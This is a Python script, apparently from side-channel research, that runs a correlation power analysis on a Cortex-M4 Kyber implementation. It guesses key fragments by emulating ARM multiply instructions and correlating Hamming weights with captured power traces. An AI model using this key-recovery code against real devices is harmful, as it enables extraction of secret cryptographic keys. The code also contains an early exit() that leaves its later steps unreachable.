"""
    statistical_analysis.py

    Module to recover the key from the captured power traces, using Pearson correlation coefficient.
"""

from json import loads
from tqdm import tqdm
from typing import Generator, Any
import matplotlib.pyplot as plt
import numpy as np
from arm import *

ciphertexts = []

def parse_firmware_output(output):
    """
        Fetches and parses the output of the Cortex-M4 to recover the inputs (ciphertexts)
        of the indcpa_dec function.
    """
    with open(output, 'r') as f:
        readingCT = False
        ciphertext = bytes()
        for (cpt, line) in enumerate(map(lambda l: l.strip('\n'), f.readlines())):
            if '++++' == line:
                readingCT = not(readingCT)
                if readingCT == False:
                    if cpt % 25 != 0:
                        ciphertexts.append(ciphertext)
                    ciphertext = bytes()
            elif readingCT:
                ciphertext += int(line).to_bytes(2, signed=True)

parse_firmware_output('ciphertexts')

# Loads the matrix of captured power traces
with open('traces.log', 'r') as f:
    trace_matrix = []
    for line in f.readlines():
        trace_matrix += loads(line)

sample_matrix = np.asarray([np.asarray([trace_matrix[i][j] for i in range(len(trace_matrix))]) for j in range(len(trace_matrix[0]))])

part_key_length = 2**16

# max_pearson_corr: ceiling (discriminant) on Pearson's correlation coefficient
max_pearson_corr = 0.6

def hammingWeight(byte: bytes) -> int:
    """
        Gives the hamming weight of a byte.
    """
    return int.from_bytes(byte).bit_count()

prec = np.float64

def pearson(x, y) -> int:
    """
        Returns the Pearson's correlation coefficient between the sets x and y.
    """
    xmean = x.mean(dtype=prec)
    ymean = y.mean(dtype=prec)
    xm = x.astype(prec) - xmean
    ym = y.astype(prec) - ymean
    normxm = np.linalg.norm(xm)
    normym = np.linalg.norm(ym)
    r = np.dot(xm/normxm, ym/normym)
    return max(min(r, 1.0), -1.0)

def pearsonx(xr, y) -> int:
    """
        Simulates the partial application of x |-> pearson(x, .).
        xr is the pre-computed data of the set x before involving y's data in the
        Pearson's correlation coefficient.
    """
    ymean = y.mean(dtype=prec)
    ym = y.astype(prec) - ymean
    normym = np.linalg.norm(ym)
    r = np.dot(xr, ym/normym)
    return max(min(r, 1.0), -1.0)

def pearson_traces(rstr) -> int:
    """
        Compute Pearson correlation coefficient between Ti and rst for all i and keeps the biggest absolute value of it.
    """
    pcc_traces = (pcc for pcc in map(lambda sample_trace: abs(pearsonx(rstr, sample_trace)), sample_matrix) \
                    if pcc > max_pearson_corr)
    max_pcc = max(pcc_traces, default=0)
    return max_pcc

# Kyber parameters
qa = (26632).to_bytes(4)
q = (3329).to_bytes(4)
# In ntt.c -> const int32_t zetas[64] = {21932846, 3562152210, 752167598, 3417653460, 2112004045, 932791035...
zeta = (3417653460).to_bytes(4)
nzeta = (2**32-int.from_bytes(zeta)).to_bytes(4)

def deserialize(a : bytes):
    """
        Rewrote of `deserialize` from poly_asm.S.
    """
    # First, we construct t0, then t1
    tmp = a[2]
    t0 = a[6]

    t1 = (t0 >> 12) & 0xF
    t0 &= 0xFFF
    t1 |= tmp << 4
    t0 |= t1 << 16

    # tmp is free now
    tmp2 = a[3]
    tmp3 = a[5]

    t1 = (tmp2 >> 12) & 0xF
    tmp = tmp2 & 0xFFF
    t1 |= (tmp3 << 4)
    t1 = tmp | (t1 << 16)
    return (t0, t1)


def k2k3_guesser() -> Generator[tuple[bytes, int], Any, None]:
    """
        Keeps a sample S = {k2k3 such that P CCk2k3 > x}, x being the chosen discriminant.
        Produces the sample "on the fly" using pythonic iterators.
    """
    # 1. Make a guess for k2k3 (216 possibilities) and compute the result rst = [rst0, ..., rst200]
    # where rsti is the Hamming weight of the operation smultt on line 25 of doublebasemul using the ith ciphertext.
    for k2k3 in map(lambda k: k.to_bytes(2), tqdm(range(29446-2**7, 29446+2**7))):
        # Emulation of the ARM set of instructions
        t0 = deserialize(bytes(2) + k2k3[0].to_bytes() + bytes(3) + k2k3[1].to_bytes())[0].to_bytes(4)
        tmp = smulwt(zeta, t0)
        tmp = smlabt(tmp, q, qa)

        rst = np.asarray([hammingWeight(smultt(ciphertext[4:], tmp)) for ciphertext in ciphertexts])
        rstmean = rst.mean(dtype=prec)
        rstm = rst.astype(prec) - rstmean
        normrstm = np.linalg.norm(rstm)
        rstr = rstm / normrstm

        max_pcc = pearson_traces(rstr)
        if max_pcc:
            yield (k2k3, max_pcc)

## Plots Pearson correlation coefficient resulting from the smultt operation ##
guessed = list(k2k3_guesser())
k2k3 = max(guessed, key=lambda x: x[1])[0]
print(k2k3)
print(b's\x06' in map(lambda x: x[0], guessed))
print(len(guessed))

t0 = deserialize(bytes(2) + k2k3[0].to_bytes() + bytes(3) + k2k3[1].to_bytes())[0].to_bytes(4)
tmp = smulwt(zeta, t0)
tmp = smlabt(tmp, q, qa)
rst = np.asarray([hammingWeight(smultt(ciphertext, tmp)) for ciphertext in ciphertexts])
pcc_tab = [pearson(sample_trace, rst) for sample_trace in sample_matrix]

plt.plot(pcc_tab)
plt.xlabel('Sample')
plt.ylabel('PCC')
plt.show()
exit()
## End plot ##

# 4. Fix k2k3 in S, make a guess for k0k1 and compute the result rst' of pkhtb for all of the ciphertexts.
# Then compute Pearson correlation between rst' and the power traces, keep the largest value in absolute PCCk0k1k2k3.
candidates_k0k1k2k3 = []
for k2k3 in map(lambda k: k[0], k2k3_guesser()):
    # 5. Redo step 4 for all the k0k1 in S.
    for k0k1 in range(16780-2**4, 16780+2**4):
        k0k1k2k3 = k0k1.to_bytes(2) + k2k3
        (t0, t1) = map(lambda x: x.to_bytes(4), deserialize(bytes(2) + k0k1k2k3[2].to_bytes() + k0k1k2k3[0].to_bytes() + bytes(1) + k0k1k2k3[1].to_bytes() + k0k1k2k3[3].to_bytes()))
        tmp = smulwt(zeta, t0)
        tmp = smlabt(tmp, q, qa)

        rst = np.asarray([hammingWeight(smlabb(ciphertext, t0, smultt(ciphertext, tmp))) for ciphertext in ciphertexts])
        rstmean = rst.mean(dtype=prec)
        rstm = rst.astype(prec) - rstmean
        normrstm = np.linalg.norm(rstm)
        rstr = rstm / normrstm

        max_pcc = pearson_traces(rstr)
        if max_pcc:
            candidates_k0k1k2k3.append((k0k1k2k3, max_pcc))

# 6. The part of the key k0k1k2k3 with the largest PCCk0k1k2k3 is the correct guess.
key = max(candidates_k0k1k2k3, key=lambda x: x[1])[0]
print("Key = ", key)
awaited_key = b'A\x8cs\x06'
print(awaited_key in map(lambda k: k[0], candidates_k0k1k2k3))
print(len(candidates_k0k1k2k3))

(t0, t1) = map(lambda x: x.to_bytes(4), deserialize(bytes(2) + key[2].to_bytes() + key[0].to_bytes() + bytes(1) + key[1].to_bytes() + key[3].to_bytes()))
tmp = smulwt(zeta, t0)
tmp = smlabt(tmp, q, qa)

rst = np.asarray([hammingWeight(smlabb(ciphertext, t1, smultt(ciphertext, tmp))) for ciphertext in ciphertexts])
pearson_traces = [pearson(sample_trace, rst) for sample_trace in sample_matrix]
plt.plot(pearson_traces)
plt.show()
